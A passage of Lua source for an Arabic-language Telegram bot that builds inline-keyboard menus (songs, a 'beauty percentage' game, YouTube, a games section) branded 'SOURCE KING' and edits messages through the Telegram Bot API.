{{text = 'غنيلي', callback_data="/help17"}},
{{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليوتيوب', callback_data="/help24"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》', url="t.me/S0URCE_KING"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)❳ 
]]
keyboard = {} 
